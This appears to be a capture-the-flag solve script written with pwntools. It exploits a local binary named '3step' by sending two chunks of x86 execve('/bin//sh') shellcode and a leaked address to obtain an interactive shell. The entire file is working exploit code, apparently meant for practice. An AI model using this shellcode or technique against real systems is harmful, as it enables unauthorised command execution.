from pwn import *

bin_sh = ["push %d"%u32("/sh\0"), "push %d"%u32("/bin")]

p = process("./3step")
p.recvuntil("snacks\n")

shellcode_start = int(p.recv(10),16)
print("shellcode_start: {}".format(hex(shellcode_start)))
p.recvuntil("\n")
shellcode_continue = int(p.recv(10),16)
print("shellcode_start: {}".format(hex(shellcode_continue)))

shellcode_part1 = '''
xor ecx, ecx
push ecx
mul ecx
push 0x68732f2f 
mov edi, {0}
jmp edi'''.format(hex(shellcode_continue))

# print(shellcode_part1)
shellcode_part1 = asm(shellcode_part1)
print("Length of shellcode_part1: {}".format(len(shellcode_part1)))

shellcode_part2 = '''
push 0x6e69622f
mov ebx, esp
mov al, 11
int 0x80'''#.format(bin_sh[1])

# print(shellcode_part2)
shellcode_part2 = asm(shellcode_part2)
print("Length of shellcode_part2: {}".format(len(shellcode_part2)))

p.sendlineafter("Step 1:", shellcode_part1)
p.sendlineafter("Step 2:", shellcode_part2)
p.sendlineafter("Step 3:", p32(shellcode_start))

p.interactive()
